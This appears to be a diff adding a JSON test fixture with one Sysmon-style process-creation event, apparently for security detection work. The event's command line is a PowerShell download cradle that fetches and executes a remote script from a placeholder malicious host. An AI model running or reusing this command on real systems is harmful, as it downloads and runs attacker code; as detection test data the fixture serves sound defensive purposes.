@@ -1,0 +1,12 @@
+[
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/loader.ps1')\"",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\jdoe",
+    "ProcessId": 7200,
+    "ParentProcessId": 3140,
+    "Timestamp": "2024-01-15T14:00:00.000Z"
+  }
+]
